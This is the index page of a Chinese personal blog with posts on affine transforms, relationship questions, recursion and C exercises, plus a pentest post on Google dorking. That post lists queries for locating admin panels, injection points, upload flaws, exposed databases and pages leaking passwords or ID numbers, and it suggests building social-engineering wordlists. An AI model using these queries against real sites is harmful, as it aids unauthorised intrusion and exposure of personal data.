<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"allofmortal.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://allofmortal.github.io/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale">
<meta property="article:author" content="Mortal">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://allofmortal.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-Hans'
  };
</script>

  <title>Hexo</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="تشغيل شريط التصفح">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Hexo</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>معلومات</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>الوسوم<span class="badge">20</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>التصنيفات<span class="badge">14</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>الأرشيفات<span class="badge">28</span></a>

  </li>
        <li class="menu-item menu-item-commonweal">

    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/yourname" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2026/01/28/graphic/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2026/01/28/graphic/" class="post-title-link" itemprop="url">graphic</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>
              

              <time title="أُنشأ: 2026-01-28 21:48:26 / عُدل: 23:03:00" itemprop="dateCreated datePublished" datetime="2026-01-28T21:48:26+08:00">2026-01-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="definition"><a href="#definition" class="headerlink" title="definition"></a>definition</h3><h4 id="Affine-Transformation"><a href="#Affine-Transformation" class="headerlink" title="Affine Transformation"></a>Affine Transformation</h4><p>Linear Transformation + Translate<br>线性变换 (Linear Transformation)： 你可以对这个网格进行 旋转 (Rotate)、缩放 (Scale)、切变 (Shear)。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2024/08/22/%E4%BF%83%E8%BF%9B%E5%85%B3%E7%B3%BB%E7%9A%8436%E4%B8%AA%E9%97%AE%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/08/22/%E4%BF%83%E8%BF%9B%E5%85%B3%E7%B3%BB%E7%9A%8436%E4%B8%AA%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">促进关系的36个问题</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>
              

              <time title="أُنشأ: 2024-08-22 10:36:13 / عُدل: 10:45:29" itemprop="dateCreated datePublished" datetime="2024-08-22T10:36:13+08:00">2024-08-22</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <ol>
<li><p>如果可以邀请世界上任何一个人，你希望谁作为晚餐的客人？</p>
</li>
<li><p>你想出名吗？以什么方式？</p>
</li>
<li><p>在打电话之前，你会排练要说的内容吗？为什么？</p>
</li>
<li><p>对你来说，怎样的一天才算“完美”？</p>
</li>
<li><p>你上次唱歌给自己听是什么时候？唱歌给别人听呢？</p>
</li>
<li><p>如果你能活到90岁，并在生命的最后60年里保持30岁的头脑或身体，你会选择哪一个？</p>
</li>
<li><p>你是否有预感自己会怎么死？</p>
</li>
<li><p>说出你和你的配对者似乎有的三个共同点。</p>
</li>
<li><p>你对生活中最感激的事情是什么？</p>
</li>
<li><p>如果你可以改变你成长过程中的任何一点，你会改变什么？</p>
</li>
<li><p>用四分钟时间尽可能详细地告诉你的配对者你的生活故事。</p>
</li>
<li><p>如果你明天醒来说可以拥有任何一种特质或能力，那会是什么？</p>
</li>
<li><p>如果水晶球可以告诉你关于你自己、你的生活、未来或是其他任何事情的真相，你最想知道什么？</p>
</li>
<li><p>是否有什么事情你梦想已久，一直没有去做？为什么没有去做？</p>
</li>
<li><p>你一生中最大的成就是什么？</p>
</li>
<li><p>你在友谊中最看重什么？</p>
</li>
<li><p>你最珍贵的记忆是什么？</p>
</li>
<li><p>你最糟糕的记忆是什么？</p>
</li>
<li><p>如果你知道一年后你将会突然死去，你会改变现在的生活方式吗？为什么？</p>
</li>
<li><p>友谊对你意味着什么？</p>
</li>
<li><p>爱和感情在你的生活中扮演什么角色？</p>
</li>
<li><p>交替分享你认为对方的正面特质。总共分享五项。</p>
</li>
<li><p>你的家庭有多亲密和温暖？你觉得自己童年比大多数人快乐吗？</p>
</li>
<li><p>你对与母亲的关系感觉如何？</p>
</li>
<li><p>各自说出三个真实的“我们”。例如：“我们都在这个房间里感觉……”。</p>
</li>
<li><p>完成句子：“我希望我有一个可以分享……的人”</p>
</li>
<li><p>如果你要给你的室友或者朋友写信，分享他们需要知道的重要事情。</p>
</li>
<li><p>告诉你的室友或者朋友你感激他们什么；这次要非常诚实，说出你可能不会对刚认识的人说的话。</p>
</li>
<li><p>鼓励你的室友分享生活中一个尴尬的时刻。</p>
</li>
<li><p>你上次在别人面前哭是什么时候？自己一个人哭呢？</p>
</li>
<li><p>告诉你的室友或者朋友你已经喜欢他们什么。</p>
</li>
<li><p>有什么事是你认为不能开玩笑的？</p>
</li>
<li><p>如果你今晚就要去世，没有机会与任何人沟通，你最遗憾没有告诉某人的事情是什么？为什么还没有告诉他们？</p>
</li>
<li><p>你的房子着火了，里面所有你拥有的东西都在里面。在救出你所爱的人和宠物之后，你有时间安全地冲回去再救一样东西。那会是什么？为什么？</p>
</li>
<li><p>在你的家人中，谁的去世会让你感到最痛苦？为什么？</p>
</li>
<li><p>分别问另一个人问题，询问你希望他们告诉你一些事情，看看他们会如何回答。另外，请你的室友反馈出你对所选问题的感觉。</p>
</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2024/06/26/hacking-grammar/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/06/26/hacking-grammar/" class="post-title-link" itemprop="url">hacking grammar</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>
              

              <time title="أُنشأ: 2024-06-26 15:38:03 / عُدل: 15:41:44" itemprop="dateCreated datePublished" datetime="2024-06-26T15:38:03+08:00">2024-06-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">في</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">pentest</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>site：可以限制你搜索范围的域名.<br>    site:.gov</p>
<p>inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用.<br>    inurl:qq.com</p>
<p>intext: 只搜索网页<body>部分中包含的文字(也就是忽略了标题、URL等的文字)<br>    intext:色色</p>
<p>intitle: 查包含关键词的页面，一般用于社工别人的webshell密码<br>    intitle:edu</p>
<p>filetype:搜索文件的后缀或者扩展名<br>    filetype:txt<br>    filetype:pdf</p>
<p>link: 可以得到一个所有包含了某个指定URL的页面列表.<br>    link:weixin.com</p>
<p>related: 搜索相关网站<br>    related:qq.com</p>
<p>define: 搜索词语的解释,  可以搜索名词及名人<br>    define:锻炼<br>    天天:define<br>    刘翔 define<br>    吴亦凡 define</p>
<p>翻译<br>    I don’t know the means of the word 翻译<br>    翻译 apple</p>
<p>allinurl: 搜索网址中包含以下所有词<br>    allinurl:渗透 安全</p>
<p>allintext: 指定范围搜索（正文出现关键词）<br>    allintext:渗透</p>
<p>精确搜索: 给关键词加引号<br>    “渗透”<br>    ‘渗透’</p>
<p><code>-</code> （减号）: 从搜索结果中排除特定字词,<br>      从要排除的字词前加上’-‘<br>    linux常用命令</p>
<pre><code>#会显示所有搜索结果
linux常用命令 -CSDN
#会屏蔽掉搜索结果中的CSDN相关内容
</code></pre><p><code>+</code> （加号）: 只显示+后面的内容<br>    linux常用命令 +CSDN</p>
<pre><code>#只显示搜索结果中CSDN的相关内容
linux常用命令 +博客园
#只显示搜索结果中博客园的相关内容
</code></pre><p>cache: 查看网站的Google缓存版本,<br>           在相对应网址前加上”cache:”<br>    cache:qq.com</p>
<p>搜索#标签: 在字词前加上’#’</p>
<pre><code>#body
#安全
</code></pre><p>搜索特定价格: 在数字前加上$<br>    $400</p>
<p>搜索社交媒体: 在用于搜索社交媒体的字词前加上 @<br>    @qq<br>   @twitter</p>
<p>camera: 在某个数字范围内执行搜索<br>             在两个数字之间加上…<br>    camera $50…$100<br>    camera 9999…100000</p>
<p>inanchor or allinanchor: 搜索范围限制在页面的链接锚点描述文本进行搜索</p>
<p>AROUND: 查找两个字或词在不超过指定的距离<br>渗透 AROUND(5) 安全</p>
<p>OR: 组合搜索.默认搜索，中间空格是与(AND)，而使用OR,可以达到或的效果。<br>       在各个搜索查询之间加上“OR”<br>    marathon OR race<br>    渗透 OR 安全</p>
<p>|代表或: login|admin|manget</p>
<p>不常用语法:</p>
<p>Phonebook: 搜索电话列表</p>
<p>Rphonebook: 搜索住宅电话列表</p>
<p>Bphonebook: 商业电话列表</p>
<p>Author: 搜索Google中新闻组帖子的作者</p>
<p>Group: 搜索Google标题</p>
<p>Inanchor: 在链接文本中查找文本</p>
<p>Masgid: 通过消息id来查找谷歌的帖子</p>
<p>Daterange: 查找某个特定日期范围内发布的网页</p>
<p>Insubject: 搜索Googlegroup的主题行</p>
<p>Stocks: 搜索股票信息</p>
<p>Info: 显示Google的摘要信息</p>
<p>Define: 显示某术语的定义</p>
<p>Numrang: 搜索数字需要两个参数一个最小数，一个最大数，用破折号隔开</p>
<p><code>~</code> 同意词即类似的词</p>
<p><code>.</code> 单一的通配符</p>
<p><code>*</code> 通配符，可代表多个字母</p>
<p><code>“ ”</code> 精确查询匹配</p>
<p>布尔操作:<br>and 与<br>or 或<br>not 不</p>
<p>叠加使用: 组合使用上述所有方法，自行测试</p>
<p>注意事项:<br>1、所有的冒号都是半角，也就是英文的冒号，而不是中文的冒号<br>2、空格很重要，关键词之间一定要加空格</p>
<p>Google Hacking数据库: 汇集了非常多的有价值的搜索语句</p>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p>
<p>查找后台地址：<br>site:xxx.com  intext:管理|后台|登录|登陆|用户名|密码|系统|账号|login|system|admin<br>site:xxx.com  inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms<br>inurl:edu.cn intitle:管理<br>site:xxx.com inurl:login|inurl:admin|inurl:admin_login|inurl:system<br>site:xxx.com intitle:管理|后台|后台管理|登录|登陆<br>inurl:login|admin|admin_login|login_admin|system|user<br>site:xxx.com</p>
<p>查找文本内容： </p>
<p>site:xxx.com  intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号|admin|login|sys|managetem|password|username</p>
<p>查找可注入点：site:xxx.com inurl:aspx|jsp|php|asp<br>            site:xxx.com inurl:php?id=</p>
<p>查找上传漏洞：site:xxx.com inurl:file|load|editor|files|</p>
<p>找eweb编辑器：site:xxx.com inurl:ewebeditor|editor|uploadfile|eweb|edit</p>
<p>存在的数据库：site:域名 filetype:mdb|asp|#<br>           site:xxx.com filetype:mdb<br>           site:xxx.com filetype:数据库格式</p>
<p>查看脚本类型：site:xxx.com filetype:asp/aspx/php/jsp<br>            site:xxx.com filetype:php</p>
<p>查找目录遍历漏洞:  site:xxx.com intitle:index of </p>
<p>社工信息: site:xxx.com intitle:账号|密码|工号|学号|身份证</p>
<p>搜索各类开源的网站上面的信息: site:github.com intext:xiaodi8.com</p>
<p>迂回策略入侵：inurl:cms/data/templates/images/index/</p>
<pre><code>        实战演示
</code></pre><p>01 首先用google搜索这个站点的基本情况</p>
<p>site:xxx.com<br>从搜索结果中找到了几处该站点的域名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://aaa.xxx.com</span><br><span class="line">http://bbb.xxx.com</span><br><span class="line">http://ccc.xxx.com</span><br></pre></td></tr></table></figure>
<p>然后查看这几个域名的ip，并确认是否存在CDN<br>发现不存在CDN服务，并且子域名ip有的也不同</p>
<p>02 搜索该站点的后台地址</p>
<p>site:xxx.com intext:管理<br>site:xxx.com inurl:login<br>site:xxx.com inurl:admin<br>site:xxx.com intitle:管理<br>等其他方式也可以，自行组合即可</p>
<p>最终获取到了多个后台地址</p>
<p>03 查看服务器脚本语言</p>
<p>site:aaa.xxx.com filetype:asp<br>site:aaa.xxx.com filetype:php<br>site:aaa.xxx.com filetype:aspx<br>site:aaa.xxx.com filetype:jsp<br>等其他方式也可判断</p>
<p>最终获取到了基本的搭建组合后</p>
<p>04 尝试获取漏洞</p>
<p>site:aaa.xxx.com intext:ftp://<em>.</em><br>site:bbb.xxx.com inurl:file<br>site:ccc.xxx.com inurl:load<br>等其他漏洞的关键字自行搜索</p>
<p>得到地址后就可以进行下一步渗透了</p>
<p>05 获取人员类相关信息</p>
<p>获取二级域名<br>site:xxx.com<br>获取邮箱地址<br>site:xxx.com intext:*@xxx.com<br>获取电话信息<br>site:xxx.com intext:电话</p>
<p>在搜集到信息后，可以生成社工字典，使用工具进行跑一遍</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2024/04/28/algorithm/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/28/algorithm/" class="post-title-link" itemprop="url">algorithm</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>
              

              <time title="أُنشأ: 2024-04-28 15:46:27 / عُدل: 16:28:36" itemprop="dateCreated datePublished" datetime="2024-04-28T15:46:27+08:00">2024-04-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><p><code>for</code> 适合在预先知道迭代次数时使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (int i = 1; i &lt;= n; i++) &#123;</span><br><span class="line">        res += i;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>此求和函数的操作数量与输入数据大小 成正比，或者说成“线性关系”</p>
<p><code>while</code> 循环比 <code>for</code> 循环的自由度更高。在 while 循环中，我们可以自由地设计条件变量的初始化和更新步骤。</p>
<p><code>for(for( ))</code><br>每一次嵌套都是一次“升维”，将会使时间复杂度提高至“立方关系”“四次方关系”，以此类推。</p>
<h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><p>递归（recursion）是一种算法策略，通过函数调用自身来解决问题。它主要包含两个阶段。</p>
<ol>
<li>递：程序不断深入地调用自身，通常传入更小或更简化的参数，直到达到“终止条件”。</li>
<li>归：触发“终止条件”后，程序从最深层的递归函数开始逐层返回，汇聚每一层的结果。</li>
</ol>
<p>虽然从计算角度看，迭代与递归可以得到相同的结果，但它们代表了两种完全不同的思考和解决问题的范式。</p>
<ul>
<li>迭代：“自下而上”地解决问题。从最基础的步骤开始，然后不断重复或累加这些步骤，直到任务完成。</li>
<li>递归：“自上而下”地解决问题。将原问题分解为更小的子问题，这些子问题和原问题具有相同的形式。接下来将子问题继续分解为更小的子问题，直到基本情况时停止 <strong>（基本情况的解是已知的）</strong>。</li>
</ul>
<h4 id="尾递归"><a href="#尾递归" class="headerlink" title="尾递归"></a>尾递归</h4><p>有趣的是，<strong>如果函数在返回前的最后一步才进行递归调用</strong>，则该函数可以被编译器或解释器优化，使其在空间效率上与迭代相当。这种情况被称为尾递归（tail recursion）。</p>
<ul>
<li><strong>普通递归</strong>：当函数返回到上一层级的函数后，需要继续执行代码，因此系统需要保存上一层调用的上下文。求和操作是在“归”的过程中执行的，每层返回后都要再执行一次求和操作。</li>
<li><strong>尾递归</strong>：递归调用是函数返回前的最后一个操作，这意味着函数返回到上一层级后，无须继续执行其他操作，因此系统无须保存上一层函数的上下文。求和操作是在“递”的过程中执行的，“归”的过程只需层层返回。</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>迭代</th>
<th>递归</th>
</tr>
</thead>
<tbody>
<tr>
<td>实现方式</td>
<td>循环结构</td>
<td>函数调用自身</td>
</tr>
<tr>
<td>时间效率</td>
<td>效率通常较高，无函数调用开销</td>
<td>每次函数调用都会产生开销</td>
</tr>
<tr>
<td>内存使用</td>
<td>通常使用固定大小的内存空间</td>
<td>累积函数调用可能使用大量的栈帧空间</td>
</tr>
<tr>
<td>适用问题</td>
<td>适用于简单循环任务，代码直观、可读性好</td>
<td>适用于子问题分解，如树、图、分治、回溯等，代码结构简洁、清晰</td>
</tr>
</tbody>
</table>
</div>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2023/11/27/C-primer-question/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/27/C-primer-question/" class="post-title-link" itemprop="url">C-primer question</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>

              <time title="أُنشأ: 2023-11-27 09:37:44" itemprop="dateCreated datePublished" datetime="2023-11-27T09:37:44+08:00">2023-11-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">عُدل في</span>
                <time title="عُدل: 2024-04-17 11:16:47" itemprop="dateModified" datetime="2024-04-17T11:16:47+08:00">2024-04-17</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="经典习题"><a href="#经典习题" class="headerlink" title="经典习题"></a>经典习题</h1><ol>
<li>编写一个程序，要求用户输入一个华氏温度。程序应读取double类型的值作为温度值，并把该值作为参数传递给一个用户自定义的函数Temperatures()。该函数计算摄氏温度和开氏温度，并以小数点后面两位数字的精度显示3种温度。要使用不同的温标来表示这3个温度值。下面是华氏温度转摄氏温度的公式：<br><strong>摄氏温度 = 5.0 / 9.0 * (华氏温度 - 32.0)</strong><br>开氏温标常用于科学研究，0表示绝对零，代表最低的温度。下面是摄氏温度转开氏温度的公式：<br><strong>开氏温度 = 摄氏温度 + 273.16</strong><br>Temperatures()函数中用const创建温度转换中使用的变量。在main()函数中使用一个循环让用户重复输入温度，当用户输入 q 或其他非数字时，循环结束。scanf()函数返回读取数据的数量，所以如果读取数字则返回1，如果读取q则不返回1。可以使用==运算符将scanf()的返回值和1作比较，测试两值是否相等。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void Temperatures(double fahrenheit);</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    double fahrenheit;</span><br><span class="line">    printf(&quot;This program converts fahrenheit to celsius and kelvin.\n&quot;);</span><br><span class="line">    printf(&quot;Enter a temperature in dgrees fahrenheit (q to quit):&quot;);</span><br><span class="line">    while(scanf(&quot;%lf&quot;, &amp;fahrenheit) == 1)   // continue executing loop if user enters valid number</span><br><span class="line">    &#123;</span><br><span class="line">        Temperatures(fahrenheit);   // convert fahrenheit to celsius and kelvin</span><br><span class="line"></span><br><span class="line">        //prompt for new input</span><br><span class="line">        printf(&quot;Enter a temperatures in degrees fahrenheit (q to quit):&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;Bye!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void Temperatures(double fahrenheit)&#123;</span><br><span class="line">    const double FAHR_TO_CEL_SCALE = 5.0 / 9.0;</span><br><span class="line">    const double FAHR_TO_OFFSET = -32.0;</span><br><span class="line">    const double CEL_TO_KEL_OFFSET = 273.16;</span><br><span class="line"></span><br><span class="line">    double celsius = (fahrenheit + FAHR_TO_OFFSET) * FAHR_TO_CEL_SCALE;</span><br><span class="line">    double kelvin = celsius + CEL_TO_KEL_OFFSET;</span><br><span class="line"></span><br><span class="line">    printf(&quot;%.2f degrees fahrenheit is %.2f degrees celsius or %.2f degrees kelvin.\n&quot;,</span><br><span class="line">           fahrenheit, celsius, kelvin);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>编写一个程序，创建一个包含26个元素的数组，并在其中储存26个小写字母。然后打印数组的所有内容。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define SIZE 26</span><br><span class="line">int main(void)&#123;</span><br><span class="line">    char alphabet[SIZE];</span><br><span class="line">    for (char index=&#x27;a&#x27;;index&lt;&#x27;a&#x27; + SIZE;index++)</span><br><span class="line">        alphabet[index-&#x27;a&#x27;]= index;</span><br><span class="line">    for (int index = 0; index &lt; SIZE; index++)</span><br><span class="line">        printf(&quot;%c &quot;, alphabet[index]);</span><br><span class="line">    